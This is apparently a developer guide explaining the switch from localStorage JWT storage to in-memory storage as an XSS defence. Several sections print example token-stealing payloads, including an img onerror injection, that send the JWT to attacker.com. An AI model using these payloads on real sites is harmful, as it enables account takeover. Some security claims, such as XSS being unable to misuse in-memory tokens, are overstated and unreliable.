# XSS Security Vulnerability Fix - Implementation Guide

## The Problem: XSS Vulnerability with localStorage Tokens

### What is XSS (Cross-Site Scripting)?

XSS is a security vulnerability where an attacker injects malicious JavaScript code into your web application. This code runs in the context of your users' browsers.

### How Attackers Exploit localStorage Tokens

**Original Vulnerable Code:**

```javascript
// ❌ VULNERABLE: Token stored in localStorage
localStorage.setItem("jwtToken", token);

// Attacker's XSS payload:
const token = localStorage.getItem("jwtToken");
fetch("https://attacker.com/steal?token=" + token);
// Token now compromised!
```

**Attack Scenario:**

1. Website has XSS vulnerability (e.g., unescaped user input in comments)
2. Attacker injects malicious script: `<img src=x onerror="fetch('https://attacker.com/steal?token=' + localStorage.getItem('jwtToken'))">`
3. Victim views the comment
4. Script runs in victim's browser
5. Attacker receives the JWT token via HTTP request logs
6. Attacker can now impersonate the victim for 15 minutes (token expiration)
7. If attacker also steals refresh token, they gain access for 7 days!

### Impact

- Attacker has full access to user's account
- Can view/modify user's cart, orders, profile
- Can perform actions as the victim
- No password change needed - token is valid

## The Solution: Memory-Only Token Storage

### How It Works

**New Secure Implementation:**

```javascript
// ✅ SECURE: Token stored in memory only
let currentToken = null; // In memory, not accessible to DOM

// Attacker's XSS payload trying to steal token:
const token = localStorage.getItem("jwtToken"); // Returns null
// Attack fails! Token not in localStorage

// Attacker's payload trying to access JavaScript variable:
console.log(window.currentToken); // undefined
// Attack fails! Not exposed on window object

// Attacker tries to access the tokenManager module:
import { getToken } from "../api/tokenManager"; // SyntaxError in XSS context
// Attack fails! Cannot import ES modules from XSS context
```

### Why Memory-Only Storage is Secure

1. **Not accessible via localStorage API** - Attacker can't use `localStorage.getItem()`
2. **Not accessible via window object** - Attacker can't use `window.tokenVariable`
3. **Not accessible via DOM inspection** - Attacker can't read from HTML elements
4. **Lost on page refresh** - Token doesn't persist if page is refreshed
5. **Lexically scoped** - Only accessible within the tokenManager module

### Security Tradeoff: Token Lost on Refresh

**Tradeoff:** Token is lost when page is refreshed

```
Traditional approach: Token persists, but vulnerable to XSS
New approach: Token lost on refresh, but XSS attack fails
```

**Mitigation:** Automatic session restoration via refresh token

```
1. User refreshes page
2. Token lost from memory
3. App initialization detects refresh token cookie
4. App calls /Auth/RefreshToken endpoint
5. Gets new token using secure refresh token cookie
6. Session restored automatically
7. User doesn't notice anything
```

## Attack Vector Analysis

### Attack 1: Initial XSS Exploit

**Scenario:** Attacker injects malicious script while user is logged in

**Original Vulnerable Code:**

```javascript
// Attacker's XSS payload
const token = localStorage.getItem("jwtToken"); // Got token!
const user = localStorage.getItem("user"); // Got user!
// Send to attacker's server
fetch("https://attacker.com/steal", {
  method: "POST",
  body: JSON.stringify({ token, user }),
});
```

**With New Secure Implementation:**

```javascript
// Attacker's XSS payload
const token = localStorage.getItem("jwtToken"); // Returns null
const user = localStorage.getItem("user"); // Returns user object (non-sensitive)
// Cannot steal token - XSS attack fails!
```

### Attack 2: XSS After Page Refresh

**Scenario:** Attacker injects malicious script after user refreshes page

**Original Vulnerable Code:**

```javascript
// After refresh, token still in localStorage
setTimeout(() => {
  const token = localStorage.getItem("jwtToken"); // Still there!
  // Token is older but still valid
  fetch("https://attacker.com/steal", {
    method: "POST",
    body: JSON.stringify({ token }),
  });
}, 5000); // Wait 5 seconds after page load
```

**With New Secure Implementation:**

```javascript
// After refresh, token is gone from memory
setTimeout(() => {
  const token = localStorage.getItem("jwtToken"); // Returns null
  // Cannot steal - attack fails!
}, 5000);

// Even if attacker waits longer, token is still not in localStorage
// It's only in memory, and XSS scripts can't access it
```

### Attack 3: Persistent XSS (Stored XSS)

**Scenario:** Attacker stores XSS payload in database (e.g., user comment)

**Original Vulnerable Code:**

```javascript
// Attacker's payload stored in database
// Runs every time user loads the page
const token = localStorage.getItem("jwtToken");
fetch("https://attacker.com/steal?token=" + token);

// Result: Token stolen on every page load until user logs out!
```

**With New Secure Implementation:**

```javascript
// Attacker's payload stored in database
const token = localStorage.getItem("jwtToken"); // Returns null
// Attack fails on every page load
```

## Implementation Details

### Token Manager Module

**File:** `src/api/tokenManager.js`

```javascript
let currentToken = null; // Private variable - not exposed globally

export const setToken = (token, expiresOn) => {
  currentToken = token; // Stored in memory only
};

export const getToken = () => {
  return currentToken; // Lexically scoped access
};

export const clearToken = () => {
  currentToken = null; // Securely cleared
};
```

### Why Module-Level Variable is Secure

```javascript
// ❌ Insecure - exposed on window object
window.currentToken = token;
// Attacker can access: window.currentToken

// ✅ Secure - lexically scoped to module
let currentToken = null;
export const getToken = () => currentToken;
// Attacker cannot access: currentToken is in module closure
// Attacker cannot import ES module from XSS context
```

### Axios Interceptor Integration

```javascript
// Request interceptor uses tokenManager
api.interceptors.request.use((config) => {
  const token = getToken(); // From tokenManager
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

// Token automatically added to all requests
// No need for application code to handle tokens
```

## Comparison: Before vs After

| Feature              | Before (Vulnerable)                        | After (Secure)          |
| -------------------- | ------------------------------------------ | ----------------------- |
| **JWT Storage**      | localStorage                               | Memory only             |
| **XSS Attack**       | ✓ Can steal token                          | ✗ Cannot steal          |
| **Persistence**      | Across refreshes                           | Lost on refresh         |
| **Session Recovery** | Manual re-login                            | Auto via refresh token  |
| **User Experience**  | Create a bug (stays logged in through XSS) | Seamless (auto refresh) |
| **Security**         | HIGH RISK                                  | PROTECTED               |

## Token Lifecycle with Security

### Initial Login

```
User enters credentials
    ↓
[Login API Call]
    ↓
Backend returns JWT + refresh token
    ↓
JWT stored in MEMORY (secure)
Refresh token stored in HTTP-only cookie (secure)
    ↓
Session established
User can access protected resources
```

### Page Refresh

```
User refreshes page
    ↓
JWT lost from memory (by design)
Browser keeps refresh token cookie
    ↓
[App Initialization]
    ↓
Detects refresh token cookie
Calls /Auth/RefreshToken
    ↓
Backend validates refresh token
Returns new JWT
    ↓
New JWT stored in memory
Session restored
    ↓
User continues without interruption
```

### Logout

```
User clicks logout
    ↓
[Logout API Call]
    ↓
Server revokes all refresh tokens
Server removes refresh token cookie
    ↓
[App Side]
    ↓
clearToken() removes JWT from memory
localStorage.removeItem('user')
Redirect to login page
    ↓
All tokens destroyed
Session completely terminated
```

### XSS Attack While Logged In

```
User logged in (JWT in memory)
    ↓
[XSS Vulnerability Exploited]
    ↓
Attacker's script runs
Tries: localStorage.getItem('jwtToken')
    ↓
Returns null (token not in localStorage)
    ↓
Attack FAILS - attacker cannot get token
    ↓
Only refresh token exposed (HTTP-only - inaccessible to scripts)
Attacker cannot use refresh token (requires HTTPS POST, blocked by CORS)
```

## Best Practices for Further Security

### 1. Input Validation & Escaping

```javascript
// ❌ Vulnerable - unescaped user input
<div>{userComment}</div>

// ✅ Secure - React escapes by default
<div>{userComment}</div> // React escapes automatically

// ✅ Secure - explicit sanitization if needed
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userComment) }} />
```

### 2. Content Security Policy (CSP)

Add to backend response headers:

```
Content-Security-Policy: script-src 'self'
```

Prevents inline scripts and external script injection.

### 3. HTTP Headers

```
Strict-Transport-Security: max-age=31536000
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
```

### 4. Regular Security Audits

```bash
# Audit dependencies for vulnerabilities
npm audit

# Check for insecure code patterns
npm install -g eslint eslint-plugin-security
```

### 5. Subscribe to Security Advisories

- npm security advisories
- React security announcements
- OWASP top 10

## Migration Checklist

If you're upgrading from localStorage tokens:

- [ ] Review authApi.js - now uses tokenManager
- [ ] Review axiosConfig.js - uses getToken() from tokenManager
- [ ] Review AuthContext.jsx - no localStorage token calls
- [ ] Review any custom auth code - may need refactoring
- [ ] Test login flow - token should work
- [ ] Test page refresh - session should restore
- [ ] Test logout - all tokens cleared
- [ ] Test XSS simulation - token should be protected
- [ ] Clear localStorage - remove any lingering 'jwtToken' entries
- [ ] Test in private/incognito window - fresh session

## References

- [OWASP: Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [MDN: Cross-Site Scripting (XSS)](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting_XSS)
- [OWASP: Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [Auth0: XSS Prevention](https://auth0.com/blog/authentication-in-spa-react-angular-vue/)
- [NIST: Digital Identity Guidelines](https://pages.nist.gov/800-63-3/)
